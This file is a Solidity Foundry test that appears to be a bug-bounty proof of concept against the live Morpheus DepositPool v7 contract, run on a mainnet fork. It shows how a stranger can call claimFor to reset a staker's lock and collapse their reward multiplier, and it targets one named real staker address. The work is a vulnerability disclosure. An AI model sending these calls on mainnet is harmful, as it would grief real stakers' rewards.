// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console, Vm} from "forge-std/Test.sol";

/// @title C-1 [Medium] — `claimFor` griefing, LIVE on DepositPool v7 (mainnet fork PoC)
/// @notice Bug-bounty PoC for the Morpheus Bug Bounty v2 (mor.org).
/// @dev
/// TARGET: DepositPool (stETH) proxy 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790
///        (DepositPool v7, Ethereum mainnet), forked at a pinned block.
///
/// MECHANISM (verified against the live implementation):
///   DepositPool.claimFor() (DepositPool.sol:284-292) SKIPS the `claimSender`
///   authorization check entirely when the victim has ever called
///   setClaimReceiver(): the receiver is forced to the victim's chosen
///   receiver and ANY address may trigger the claim. `_claim()` (:551-552)
///   then resets `claimLockStart = claimLockEnd = 0` and recomputes
///   `virtualDeposited` with multiplier (0,0) = exactly 1x — destroying the
///   victim's lock multiplier (up to ~10.7x) permanently.
///
///   The MOR still goes to the VICTIM's receiver (pure griefing, no theft);
///   the attacker only pays gas + the LayerZero fee.
///
/// RUN:  forge test
///   Reads the RPC URL from the FORK_RPC_URL env var (default
///   https://ethereum.publicnode.com; falls back to https://1rpc.io/eth then
///   https://rpc.flashbots.net if the first RPC cannot serve the pinned
///   block). Block is read from FORK_BLOCK (default 26395272). No other
///   setup is needed. NO mainnet/testnet transactions, fork/read-only only.
///   No privileged account is ever impersonated (no vm.prank as owner, admin,
///   multisig, oracle or any other trusted role): the attacker is an
///   arbitrary fresh address, the victim is a real mainnet staker (test 1)
///   or a fresh address that obtains stETH through the real Lido contract
///   in the fork (tests 2-3).
///
/// TESTS:
///   1. test_RealVictim_StrangerClaimFor — attacks a REAL mainnet staker
///      (0xaf32bb3892f37c518f3841275f131384a41b9b57) who set a claim receiver
///      on the live stETH pool (tx 0xbf1dcdd1...). Zero harness tricks:
///      no warp, no mocks, no donations. Proves the bypass is triggerable
///      live, right now, by a stranger.
///      (Caveat: both real receiver-setters have ~1.01x multipliers from a
///      referral, not from a long lock, so the observable damage is the
///      lock reset to 0 + the forced claim itself. Test 2 proves the
///      10.5x -> 1x magnitude.)
///   2. test_SyntheticVictim_MultiplierCollapse — a fresh victim stakes
///      ~100 stETH with a 10-year lock (~10.5x), sets a receiver, then a
///      stranger force-claims after the lock expires: multiplier collapses
///      to exactly 1x, claimLockEnd -> 0, virtualDeposited -> deposited.
///   3. test_StrangerClaimForWithoutReceiverReverts — control: the same
///      stranger call reverts "DS: invalid caller" for a staker who never
///      set a receiver, proving the bypass is gated exactly on
///      `claimReceiver` being set.
///
/// FORK-HARNESS DISCLOSURE (test 2 only — the warp freezes two continuous
/// real-world processes, so the harness emulates them; both are disclosed
/// and neither changes the audited code path):
///   (a) Chainlink feeds: after a 10-year warp the on-chain aggregator
///       answers are stale, so `distributeRewards()` would fail its price
///       check. The harness mockCalls each aggregator's `latestRoundData()`
///       to return the SAME live price it had at fork time, with
///       updatedAt = current (warped) time — i.e. what a live Chainlink
///       feed would return. The Morpheus ChainLinkDataConsumer is NOT mocked.
///   (b) stETH yield: the stETH pool (strategy NONE) accrues yield only
///       from Lido rebases, which stop in a fork without oracle reports.
///       Without any yield, `distributeRewards()` parks the 10 years of
///       emission in `undistributedRewards` and the victim's pending
///       rewards stay 0, so `_claim` would revert on "DS: nothing to
///       claim" — not because the finding is wrong, but because the fork
///       froze the yield. The harness donates a small amount of stETH
///       (0.001) to the Distributor, which the Distributor's own accounting
///       treats as yield (the exact path real rebase gains take), letting
///       the claim execute. CONSEQUENCE: the MOR amount minted in test 2
///       is a HARNESS ARTIFACT (the stETH pool receives ~100% of the
///       10-year parked emission in one distribution) and MUST NOT be
///       quoted as the victim's real future yield. The test asserts the
///       STATE DAMAGE (multiplier, lock, virtualDeposited), not the amount.
///       Real impact quantification lives in REPORT.md / notes.md, computed
///       from live on-chain state, not from this number.
interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable;
    function setClaimReceiver(uint256 rewardPoolIndex_, address receiver_) external;
    function usersData(address user_, uint256 pool_) external view returns (
        uint128 lastStake,
        uint256 deposited,
        uint256 rate,
        uint256 pendingRewards,
        uint128 claimLockStart,
        uint128 claimLockEnd,
        uint256 virtualDeposited,
        uint128 lastClaim,
        address referrer
    );
    function claimReceiver(uint256 pool_, address user_) external view returns (address);
    function claimSender(uint256 pool_, address staker_, address sender_) external view returns (bool);
    function getCurrentUserMultiplier(uint256 pool_, address user_) external view returns (uint256);
    function getLatestUserReward(uint256 pool_, address user_) external view returns (uint256);
    function depositToken() external view returns (address);
    function distributor() external view returns (address);
    function version() external view returns (uint256);
}

interface IDistributor {
    // NOTE: `depositPools` is declared WITHOUT its struct return type:
    // decoding the getter's struct (which contains a `string`) through an
    // interface call reverts with the via-IR code generator used by this
    // project, while a raw staticcall + abi.decode of the same tuple works.
    // The pool's `chainLinkPath` is therefore read via the raw call in
    // `_captureFeedAnswers` (see there). The selector is identical either way.
    function depositPools(uint256 pool_, address dp_) external view returns (address, string memory, uint256, uint256, uint256, uint8, address, bool);
    function depositPoolAddresses(uint256 pool_, uint256 i_) external view returns (address);
    function l1Sender() external view returns (address);
}

interface IL1SenderV2 {
    function layerZeroConfig()
        external
        view
        returns (
            address gateway,
            address receiver,
            uint16 receiverChainId,
            address zroPaymentAddress,
            bytes memory adapterParams
        );
}

interface ILZEndpointV1 {
    function estimateFees(
        uint16 dstChainId_,
        address userApplication_,
        bytes calldata payload_,
        bool payInZRO_,
        bytes calldata adapterParams_
    ) external view returns (uint256 nativeFee, uint256 zroFee);
}

interface IStETH {
    function submit(address referral_) external payable returns (uint256);
    function approve(address spender_, uint256 amount_) external returns (bool);
    function transfer(address recipient_, uint256 amount_) external returns (bool);
    function balanceOf(address account_) external view returns (uint256);
}

interface IChainLinkDataConsumer {
    function getPathId(string memory path_) external view returns (bytes32);
    function dataFeeds(bytes32 pathId_, uint256 i_) external view returns (address);
}

interface IAggregatorV3 {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

contract C1ClaimForGriefingForkTest is Test {
    uint256 public constant PRECISION = 1e25; // Solarity Globals PRECISION
    uint256 public constant POOL = 0;
    uint256 public constant FORK_BLOCK = 26395272; // 12 Nov 2026, block time 1794443279

    IDepositPool public constant POOL_PROXY =
        IDepositPool(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790); // DepositPool v7 (stETH)
    IDistributor public constant DISTRIBUTOR =
        IDistributor(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IL1SenderV2 public constant L1_SENDER =
        IL1SenderV2(0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84);
    IChainLinkDataConsumer public constant CLDC =
        IChainLinkDataConsumer(0xd182263d06FDC463c96190005D6359CC3d3Bbc5e);
    IStETH public constant STETH = IStETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    // Real mainnet staker who set a claim receiver on the live stETH pool
    // (ClaimReceiverSet event, tx 0xbf1dcdd1004677acd90e0d5f74eeb3a46b1bff2d623c1b4a596cc06d64b6eb74,
    //  block 25995414). At the pinned block: 0.07 stETH staked, lock expired,
    //  receiver = 0xbe1bFB539b505fA34496DAF194c6A0F30ca5eE21, pending ~0.85 MOR.
    address public constant REAL_VICTIM = 0xAf32BB3892F37c518f3841275F131384a41B9b57;
    address public constant REAL_VICTIM_RECEIVER = 0xbe1bFB539b505fA34496DAF194c6A0F30ca5eE21;

    uint256 public constant TEN_YEARS = 10 * 365 days;

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC_URL", string("https://ethereum.publicnode.com"));
        uint256 blockNo = vm.envOr("FORK_BLOCK", FORK_BLOCK);
        try vm.createSelectFork(rpc, blockNo) returns (uint256) {
            // primary RPC ok
        } catch {
            try vm.createSelectFork("https://1rpc.io/eth", blockNo) returns (uint256) {
                // fallback 1 ok
            } catch {
                vm.createSelectFork("https://rpc.flashbots.net", blockNo); // fallback 2 (reverts on failure)
            }
        }
        // Sanity: the target really is DepositPool v7.
        assertEq(POOL_PROXY.version(), 7, "target must be DepositPool v7");
        assertEq(POOL_PROXY.distributor(), address(DISTRIBUTOR), "distributor must match");
    }

    /*//////////////////////////////////////////////////////////////
                      TEST 1 — REAL LIVE VICTIM
    //////////////////////////////////////////////////////////////*/

    function test_RealVictim_StrangerClaimFor() public {
        address attacker = makeAddr("attacker");
        console.log("victim:", REAL_VICTIM);
        console.log("attacker (stranger):", attacker);

        // Preconditions: victim has a receiver set, attacker was never authorized.
        assertEq(POOL_PROXY.claimReceiver(POOL, REAL_VICTIM), REAL_VICTIM_RECEIVER, "victim must have a receiver set");
        assertFalse(POOL_PROXY.claimSender(POOL, REAL_VICTIM, attacker), "attacker must NOT be an authorized claimSender");
        assertTrue(REAL_VICTIM_RECEIVER != attacker, "receiver is not the attacker");

        uint256 pendingBefore = POOL_PROXY.getLatestUserReward(POOL, REAL_VICTIM);
        console.log("victim pending MOR before (wei):", pendingBefore);
        assertGt(pendingBefore, 0, "victim must have pending MOR to claim");

        (,,,, uint128 lockStartBefore, uint128 lockEndBefore, , ,) =
            POOL_PROXY.usersData(REAL_VICTIM, POOL);
        console.log("victim claimLockStart/End before:", lockStartBefore, lockEndBefore);
        assertEq(lockEndBefore, 1788662903, "victim lock already expired at fork block");

        // LayerZero fee for the mint message (quoted live from the endpoint).
        uint256 fee = _quoteClaimFee(REAL_VICTIM, pendingBefore);
        console.log("LayerZero fee paid by attacker (wei):", fee);
        vm.deal(attacker, fee + 1 ether);

        vm.recordLogs();
        vm.prank(attacker);
        POOL_PROXY.claimFor{value: fee}(POOL, REAL_VICTIM, attacker);

        // NOTE: vm.getRecordedLogs() CONSUMES the recorded logs, so fetch
        // them exactly once and reuse the array for both lookups.
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // The MOR went to the VICTIM's receiver (not the attacker): pure griefing.
        (address mintedTo, uint256 mintedAmount, bool foundClaim) = _findUserClaimed(logs, REAL_VICTIM);
        assertTrue(foundClaim, "UserClaimed event must be emitted");
        assertEq(mintedTo, REAL_VICTIM_RECEIVER, "mint must go to victim receiver, not attacker");
        assertGt(mintedAmount, 0, "victim must have had pending rewards claimed");
        console.log("MOR force-minted to victim receiver (wei):", mintedAmount);

        // State damage: claim lock wiped to 0 and pending reset — a stranger
        // forced the victim's claim.
        (,,,, uint128 lockStartAfter, uint128 lockEndAfter, , uint128 lastClaimAfter,) =
            POOL_PROXY.usersData(REAL_VICTIM, POOL);
        assertEq(lockEndAfter, 0, "claimLockEnd must be wiped to 0");
        assertEq(lockStartAfter, 0, "claimLockStart must be wiped to 0");
        assertEq(lastClaimAfter, block.timestamp, "lastClaim must be the attack block");
        assertEq(POOL_PROXY.getLatestUserReward(POOL, REAL_VICTIM), 0, "victim pending must be 0 after forced claim");

        // The LayerZero mint message itself was sent to the victim's receiver.
        (address lzTo, uint256 lzAmount, bool foundLz) = _findMintMessageSent(logs);
        assertTrue(foundLz, "MintMessageSent event must be emitted by L1Sender");
        assertEq(lzTo, REAL_VICTIM_RECEIVER, "LZ message must target the victim receiver");
        assertEq(lzAmount, mintedAmount, "LZ amount must match the claimed amount");
    }

    /*//////////////////////////////////////////////////////////////
                 TEST 2 — SYNTHETIC VICTIM, 10.5x -> 1x
    //////////////////////////////////////////////////////////////*/

    function test_SyntheticVictim_MultiplierCollapse() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker2");
        address receiver = makeAddr("receiver");

        // 1. Victim obtains ~100 stETH through the real Lido contract in the fork.
        // NOTE: Lido.submit() returns SHARES, not the stETH amount — the
        // stETH the victim actually holds is balanceOf() afterwards.
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        STETH.submit{value: 100 ether}(address(0));
        uint256 staked = STETH.balanceOf(victim);
        assertGe(staked, 99 ether, "Lido submit must mint ~100 stETH");

        // 2. Victim stakes it all with a 10-year claim lock.
        vm.prank(victim);
        STETH.approve(address(DISTRIBUTOR), type(uint256).max);
        uint128 lockEnd = uint128(block.timestamp + TEN_YEARS);
        vm.prank(victim);
        POOL_PROXY.stake(POOL, staked, lockEnd, address(0));

        uint256 multBefore = POOL_PROXY.getCurrentUserMultiplier(POOL, victim);
        console.log("multiplier before (x1e25):", multBefore);
        assertGt(multBefore, 5 * PRECISION, "10y lock must give a high multiplier (>5x)");

        (uint256 depositedBefore, uint128 lockEndBefore, uint256 virtBefore) = _userState(victim);
        assertEq(lockEndBefore, lockEnd, "lock end must be the 10y lock");
        assertGt(virtBefore, depositedBefore, "virtualDeposited must exceed deposited at >1x");
        console.log("deposited (wei):", depositedBefore);
        console.log("virtualDeposited before (wei):", virtBefore);

        // 3. Victim sets a claim receiver (the documented convenience feature).
        vm.prank(victim);
        POOL_PROXY.setClaimReceiver(POOL, receiver);
        assertEq(POOL_PROXY.claimReceiver(POOL, victim), receiver, "receiver must be set");

        // 4. Capture live Chainlink answers BEFORE warping (harness step a).
        (address[] memory feeds, int256[] memory answers) = _captureFeedAnswers();
        assertGt(feeds.length, 0, "must find at least one Chainlink feed");

        // 5. Time passes: the 10-year lock expires (victim keeps accruing at
        //    the locked multiplier until someone claims).
        uint256 warpedTs = block.timestamp + TEN_YEARS + 1;
        vm.warp(warpedTs);

        // 6. Harness (documented): refresh frozen Chainlink feeds + emulate
        //    10 years of stETH rebase yield with a small donation to the
        //    Distributor (see file header). Neither changes audited code.
        // NOTE: `_mockFeedsFresh` reads `block.timestamp` itself (see there):
        // do NOT pass a timestamp derived from `block.timestamp` across the
        // warp boundary as an argument — the via-IR code generator can
        // re-evaluate such an expression at the use site, after the warp.
        _mockFeedsFresh(feeds, answers);
        _donateYieldToDistributor(0.001 ether);

        // 7. A total stranger force-claims the victim.
        assertFalse(POOL_PROXY.claimSender(POOL, victim, attacker), "attacker must NOT be authorized");
        uint256 fee = _quoteClaimFee(victim, 1 ether); // fee is amount-independent (64-byte payload)
        console.log("LayerZero fee paid by attacker (wei):", fee);
        vm.deal(attacker, fee + 1 ether);

        vm.recordLogs();
        vm.prank(attacker);
        POOL_PROXY.claimFor{value: fee}(POOL, victim, attacker);

        // THE DAMAGE: lock wiped, multiplier collapsed to exactly 1x.
        uint256 multAfter = POOL_PROXY.getCurrentUserMultiplier(POOL, victim);
        console.log("multiplier after (x1e25):", multAfter);
        assertEq(multAfter, PRECISION, "multiplier must collapse to exactly 1x after forced claim");

        (uint256 depositedAfter, uint128 lockEndAfter, uint256 virtAfter) = _userState(victim);
        assertEq(lockEndAfter, 0, "claimLockEnd must be wiped to 0");
        assertEq(virtAfter, depositedAfter, "virtualDeposited must equal deposited at 1x");
        assertEq(depositedAfter, depositedBefore, "principal is untouched (griefing, not theft)");

        (address mintedTo, uint256 mintedAmount, bool foundClaim) = _findUserClaimed(vm.getRecordedLogs(), victim);
        assertTrue(foundClaim, "UserClaimed event must be emitted");
        assertEq(mintedTo, receiver, "mint must go to victim receiver");
        assertGt(mintedAmount, 0, "victim must have had pending rewards claimed");
        console.log("MOR force-minted to victim receiver (wei, HARNESS ARTIFACT - see header):", mintedAmount);
    }

    /*//////////////////////////////////////////////////////////////
                   TEST 3 — CONTROL (no receiver)
    //////////////////////////////////////////////////////////////*/

    function test_StrangerClaimForWithoutReceiverReverts() public {
        address user = makeAddr("userNoReceiver");
        address attacker = makeAddr("attacker3");

        // Same staking setup as test 2, but the user NEVER sets a receiver.
        vm.deal(user, 1 ether);
        vm.prank(user);
        STETH.submit{value: 1 ether}(address(0)); // returns shares; balance is the stETH
        uint256 staked = STETH.balanceOf(user);
        vm.prank(user);
        STETH.approve(address(DISTRIBUTOR), type(uint256).max);
        vm.prank(user);
        POOL_PROXY.stake(POOL, staked, uint128(block.timestamp + 365 days), address(0));
        assertEq(POOL_PROXY.claimReceiver(POOL, user), address(0), "control user must have no receiver");

        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        vm.expectRevert("DS: invalid caller");
        POOL_PROXY.claimFor{value: 0}(POOL, user, attacker);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPERS
    //////////////////////////////////////////////////////////////*/

    /// @notice Reads a user's deposited / claimLockEnd / virtualDeposited in
    /// one call (keeps test functions under the stack limit).
    function _userState(address user_)
        internal
        view
        returns (uint256 deposited_, uint128 lockEnd_, uint256 virt_)
    {
        (, deposited_, , , , lockEnd_, virt_, , ) = POOL_PROXY.usersData(user_, POOL);
    }

    /// @notice Quotes the LayerZero V1 fee for the mint message exactly as
    /// `L1SenderV2.sendMintMessage` will pay it (same dst chain, same
    /// adapter params, same 64-byte payload). The fee does not depend on
    /// the minted amount.
    function _quoteClaimFee(address victim_, uint256 amount_) internal view returns (uint256) {
        (address gateway, , uint16 dstChainId, , bytes memory adapterParams) = L1_SENDER.layerZeroConfig();
        ILZEndpointV1 endpoint = ILZEndpointV1(gateway);
        (uint256 nativeFee, ) =
            endpoint.estimateFees(dstChainId, address(L1_SENDER), abi.encode(victim_, amount_), false, adapterParams);
        return nativeFee;
    }

    /// @notice Captures the live Chainlink answer of every feed used by
    /// every deposit pool of reward pool 0 (before the warp).
    function _captureFeedAnswers() internal view returns (address[] memory feeds, int256[] memory answers) {
        address[] memory pools = new address[](10);
        uint256 nPools;
        for (uint256 i; i < 10; i++) {
            try DISTRIBUTOR.depositPoolAddresses(POOL, i) returns (address p) {
                pools[nPools++] = p;
            } catch {
                break;
            }
        }
        address[] memory tmpF = new address[](64);
        int256[] memory tmpA = new int256[](64);
        uint256 n;
        for (uint256 i; i < nPools; i++) {
            // Raw staticcall + tuple decode (see IDistributor note above).
            (bool ok, bytes memory ret) = address(DISTRIBUTOR).staticcall(
                abi.encodeWithSelector(IDistributor.depositPools.selector, POOL, pools[i])
            );
            require(ok, "depositPools call must succeed");
            (, string memory chainLinkPath, , , , , , ) =
                abi.decode(ret, (address, string, uint256, uint256, uint256, uint8, address, bool));
            bytes32 pathId = CLDC.getPathId(chainLinkPath);
            for (uint256 j; j < 8; j++) {
                try CLDC.dataFeeds(pathId, j) returns (address f) {
                    (, int256 ans, , ,) = IAggregatorV3(f).latestRoundData();
                    tmpF[n] = f;
                    tmpA[n] = ans;
                    n++;
                } catch {
                    break;
                }
            }
        }
        feeds = new address[](n);
        answers = new int256[](n);
        for (uint256 i; i < n; i++) {
            feeds[i] = tmpF[i];
            answers[i] = tmpA[i];
        }
    }

    /// @notice Harness step (a): makes the frozen Chainlink aggregators
    /// return the same live price with a fresh updatedAt (see file header).
    /// Reads `block.timestamp` itself: the caller must NOT pass a timestamp
    /// derived from `block.timestamp` across the `vm.warp` boundary (the
    /// via-IR code generator re-evaluates such an expression at the use
    /// site, i.e. after the warp).
    function _mockFeedsFresh(address[] memory feeds_, int256[] memory answers_) internal {
        uint256 ts = block.timestamp;
        for (uint256 i; i < feeds_.length; i++) {
            bytes memory ret = abi.encode(uint80(1), answers_[i], ts, ts, uint80(1));
            vm.mockCall(feeds_[i], abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector), ret);
        }
    }

    /// @notice Harness step (b): emulates stETH rebase yield by donating
    /// a small amount of stETH (bought via Lido) straight to the
    /// Distributor, which its own accounting counts as yield (see header).
    function _donateYieldToDistributor(uint256 amount_) internal {
        address donor = makeAddr("donor");
        vm.deal(donor, 1 ether);
        vm.prank(donor);
        STETH.submit{value: 1 ether}(address(0)); // returns shares; balance is the stETH
        uint256 got = STETH.balanceOf(donor);
        require(got >= amount_, "donor got too little stETH");
        vm.prank(donor);
        STETH.transfer(address(DISTRIBUTOR), amount_);
    }

    function _findUserClaimed(Vm.Log[] memory logs_, address victim_)
        internal
        pure
        returns (address receiver_, uint256 amount_, bool found_)
    {
        bytes32 sig = keccak256("UserClaimed(uint256,address,address,uint256)");
        for (uint256 i; i < logs_.length; i++) {
            if (logs_[i].topics.length >= 3 && logs_[i].topics[0] == sig) {
                address user = address(uint160(uint256(logs_[i].topics[2])));
                if (user == victim_) {
                    (receiver_, amount_) = abi.decode(logs_[i].data, (address, uint256));
                    return (receiver_, amount_, true);
                }
            }
        }
        return (address(0), 0, false);
    }

    function _findMintMessageSent(Vm.Log[] memory logs_)
        internal
        pure
        returns (address user_, uint256 amount_, bool found_)
    {
        bytes32 sig = keccak256("MintMessageSent(address,uint256)");
        for (uint256 i; i < logs_.length; i++) {
            if (logs_[i].topics.length >= 1 && logs_[i].topics[0] == sig) {
                (user_, amount_) = abi.decode(logs_[i].data, (address, uint256));
                return (user_, amount_, true);
            }
        }
        return (address(0), 0, false);
    }
}
